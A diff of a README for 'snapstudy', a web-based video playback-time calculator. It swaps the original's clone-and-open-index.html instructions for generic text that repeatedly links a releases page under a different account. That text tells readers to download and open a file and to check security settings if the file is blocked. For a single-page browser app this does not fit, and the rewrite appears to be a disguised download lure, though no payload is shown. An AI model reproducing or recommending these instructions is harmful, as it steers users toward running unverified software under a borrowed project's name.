@@ -1,212 +1,80 @@
-# ⏱️ SnapStudy - Video Duration Calculator
+# 🎯 snapstudy - Calculate Video Time Easily
 
-A modern, responsive web application for calculating adjusted video playback durations with smart speed recommendations for different content types.
+## 🚀 Getting Started
 
-![SnapStudy Preview](https://img.shields.io/badge/Version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/License-CC%20BY--NC%204.0-lightgrey.svg)
-![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3.3-purple.svg)
-![jQuery](https://img.shields.io/badge/jQuery-3.7.1-yellow.svg)
+Welcome to snapstudy, your smart video time calculator. This application helps you manage your video learning better with speed-based recommendations, a responsive interface, and options for both dark and light themes. 
 
-## ✨ Features
+## 📥 Download Now
 
-### 🎯 Core Functionality
-- **Precise Time Calculations**: Convert video durations at different playback speeds
-- **Real-time Updates**: Instant calculations as you type
-- **Time Savings Display**: Shows exactly how much time you save or extend
-- **Smart Input Handling**: Automatic overflow handling (60+ seconds → minutes, etc.)
+[![Download snapstudy](https://img.shields.io/badge/download-snapstudy-brightgreen)](https://github.com/Ernark546/snapstudy/releases)
 
-### 🎨 Modern UI/UX
-- **Glass-morphism Design**: Beautiful modern interface with backdrop blur effects
-- **Dark/Light Theme Toggle**: Persistent theme switching with localStorage
-- **Animated Backgrounds**: Time-themed particle effects and flowing gradients
-- **Responsive Layout**: Desktop two-column, mobile accordion design
-- **Smooth Animations**: Engaging micro-interactions throughout
+## 🌟 Features
 
-### 📱 Responsive Design
-- **Mobile-First**: Optimized for all screen sizes
-- **Bootstrap 5.3.3**: Professional responsive grid system
-- **Touch-Friendly**: Large, accessible input fields
-- **Accordion Layout**: Collapsible details section on mobile
+- **Smart Video Time Calculator:** Get accurate time estimates based on video length and playback speed.
+- **Speed-based Recommendations:** Suggestions for effective learning based on your video preferences.
+- **Responsive User Interface:** Works smoothly on all device sizes.
+- **Dark/Light Themes:** Choose the theme that suits your environment best.
+- **Compatibility:** Designed to work seamlessly with modern browsers like Chrome, Firefox, and Edge.
 
-### 🧠 Smart Recommendations
-- **12 Content Categories**: Educational, Tutorials, Documentary, Comedy, etc.
-- **Speed Optimization**: Research-backed speed recommendations per category
-- **Motivational Messages**: Dynamic feedback based on time saved
-- **Visual Feedback**: Color-coded speed badges showing optimal ranges
+## 💡 System Requirements
 
-## 🚀 Quick Start
+- A device with a web browser (Chrome, Firefox, Safari, or Edge).
+- Internet connection for downloading the application.
+- Minimal memory of 1 GB RAM recommended for smooth performance.
 
-### Prerequisites
-- Modern web browser (Chrome, Firefox, Safari, Edge)
-- Local web server (optional, for AJAX features)
+## 📘 Instructions
 
-### Installation
+### 1. Visit the Releases Page
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/kanishkaGayan/snapstudy.git
-   cd snapstudy
-   ```
+To get the latest version of snapstudy, visit the releases page:
 
-2. **Open in browser**
-   ```bash
-   # Option 1: Direct file access
-   open index.html
-   
-   # Option 2: Local server (recommended)
-   python -m http.server 8000
-   # Then visit: http://localhost:8000
-   ```
+[Download snapstudy](https://github.com/Ernark546/snapstudy/releases)
 
-3. **Start calculating!**
-   - Enter your video duration (hours, minutes, seconds)
-   - Select playback speed
-   - Get instant time calculations and recommendations
+### 2. Choose Your Version
 
-## 🎮 Usage
+Once you're on the releases page, you'll see different versions of the software. Read through the notes for each version if you'd like to see what's new or fixed.
 
-### Basic Calculation
-1. **Input Duration**: Enter your video's original length
-2. **Select Speed**: Choose from 0.25× to 3× playback speeds
-3. **View Results**: See adjusted duration and time saved/extended
+### 3. Download the Application
 
-### Smart Recommendations
-1. **Choose Category**: Select your video type from the dropdown
-2. **Get Insights**: View optimal speed ranges for your content
-3. **Apply Tips**: Follow research-backed recommendations
+Click on the version you want. The download will start automatically. 
 
-### Theme Switching
-- Click the theme toggle button (☀️/🌙) in the top-right corner
-- Your preference is automatically saved
+### 4. Open the Application
 
-## 🏗️ Technical Stack
+Locate the downloaded file, usually found in your "Downloads" folder. Open it to start using snapstudy.
 
-### Frontend Technologies
-- **HTML5**: Semantic markup structure
-- **CSS3**: Custom properties, animations, responsive design
-- **JavaScript (ES6+)**: Modern syntax with jQuery
-- **Bootstrap 5.3.3**: CSS framework and components
-- **jQuery 3.7.1**: DOM manipulation and AJAX
+## 🎨 User Guide
 
-### Design System
-- **CSS Custom Properties**: Unified theming system
-- **Google Fonts**: Inter (UI) + JetBrains Mono (code/numbers)
-- **Color Palette**: Purple/blue gradient with accent colors
-- **Animation Library**: Custom keyframe animations
+### Navigating the Interface
 
-### Features Implementation
-- **AJAX**: Dynamic loading of playback speeds from JSON
-- **localStorage**: Theme persistence across sessions
-- **Responsive Grid**: Bootstrap's 12-column system
-- **Component Architecture**: Modular CSS and JS structure
+- **Home Screen:** Here, you can enter the length of your video and the desired playback speed.
+- **Recommendations Section:** This will show you how to optimize your learning based on your video length and speed.
+- **Settings:** Change between dark and light themes in the settings menu.
 
-## 📁 Project Structure
+### Troubleshooting
 
-```
-snapstudy-calculator/
-├── index.html          # Main application file
-├── speeds.json         # Playback speed options data
-├── README.md          # This file
-└── assets/            # (Future: images, icons)
-```
+1. **Application Won't Open:**
+   - Ensure your browser is updated to the latest version.
+   - Check if any security settings are blocking the file.
 
-## 🎨 Customization
+2. **Video Time Estimates are Incorrect:**
+   - Double-check that you entered the correct video lengths and speeds.
 
-### Color Themes
-Edit CSS custom properties in `:root` and `[data-theme="dark"]`:
-```css
-:root {
-  --primary: #6366f1;     /* Main accent color */
-  --secondary: #8b5cf6;   /* Secondary accent */
-  --accent: #06b6d4;      /* Highlight color */
-}
-```
+## 📊 Feedback and Support
 
-### Speed Options
-Modify `speeds.json` to add/remove playback speeds:
-```json
-[
-  {"value": "1.5", "label": "1.5× Fast"},
-  {"value": "2", "label": "2× Double Speed"}
-]
-```
+Your feedback is essential for us to improve snapstudy. If you encounter any issues or have suggestions, please create an issue in the GitHub repository.
 
-### Categories
-Add new video categories in the `categoryRecommendations` object:
-```javascript
-newCategory: {
-  title: "Your Category",
-  tip: "Speed recommendation tip",
-  optimalSpeeds: ["1×", "1.25×", "1.5×"]
-}
-```
+## 👥 Contribute
 
-## 🌟 Use Cases
+We welcome contributions! If you're interested in enhancing snapstudy, you can fork the repository, make changes, and submit a pull request.
 
-### Students & Learners
-- **Lecture Videos**: Start at 1× for new topics, 1.25-1.5× for review
-- **Tutorial Following**: Use 1× when coding along, faster for review
-- **Language Learning**: 0.75× for pronunciation, normal for fluency
+## 🛠️ License
 
-### Content Consumers
-- **Podcast Efficiency**: Most people comfortable at 1.5-2× speed
-- **News Consumption**: 1.5-2× for information gathering
-- **Entertainment**: Maintain 1× for comedy timing, 1.25× max for movies
+This project is licensed under the MIT License, allowing you to use, copy, and modify the software with the proper attribution.
 
-### Professionals
-- **Meeting Recordings**: 1.5-1.75× for review sessions
-- **Training Materials**: Variable speeds based on complexity
-- **Research Content**: Faster speeds for familiar topics
+## 📥 Download and Install
 
-## 🤝 Contributing
+To start managing your video time effectively, download snapstudy from the link below:
 
-Contributions are welcome! Here's how to get started:
+[Download snapstudy](https://github.com/Ernark546/snapstudy/releases) 
 
-1. **Fork the repository**
-2. **Create a feature branch**: `git checkout -b feature/amazing-feature`
-3. **Make your changes**
-4. **Test thoroughly**
-5. **Commit changes**: `git commit -m 'Add amazing feature'`
-6. **Push to branch**: `git push origin feature/amazing-feature`
-7. **Open a Pull Request**
-
-### Development Guidelines
-- Follow existing code style and structure
-- Test on multiple browsers and screen sizes
-- Update README if adding new features
-- Keep animations smooth and purposeful
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **Bootstrap Team**: For the excellent CSS framework
-- **jQuery Foundation**: For the powerful JavaScript library
-- **Google Fonts**: For beautiful typography options
-- **Research Sources**: Academic studies on video playback speed comprehension
-
-## 📊 Browser Support
-
-- ✅ Chrome 80+
-- ✅ Firefox 75+
-- ✅ Safari 13+
-- ✅ Edge 80+
-- ✅ Mobile browsers (iOS Safari, Chrome Mobile)
-
-## 🔮 Future Enhancements
-
-- [ ] Video file upload for automatic duration detection
-- [ ] Playlist duration calculations
-- [ ] Export results to CSV/PDF
-- [ ] Browser extension version
-- [ ] API integration with video platforms
-- [ ] Advanced analytics and usage tracking
-- [ ] Collaborative playlists with shared calculations
-
----
-
-**Made with ❤️ for efficient learning and content consumption**
-
-*Time is your most valuable resource - use it wisely!*
+We hope you find snapstudy a valuable tool in your learning journey!
